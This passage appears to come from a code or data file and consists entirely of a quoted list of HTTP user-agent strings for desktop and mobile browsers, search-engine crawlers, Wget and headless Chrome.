  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36)",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36)",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36)",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0)",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0)",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0)",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0)",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0)",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729))",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36)",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0)",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko))",
  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7)",
  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27)))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36)",
  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322))",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN))",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1))",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0))",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727))",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022))",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362)",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0))",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063)",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0)",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy))",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html))",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm))",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html))",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+))",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp))",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html))",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php))",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com))",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot))",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0)",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0)",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36)",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0)",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36)",
  "Wget/1.17.1 (linux-gnu))",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36)",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36)",
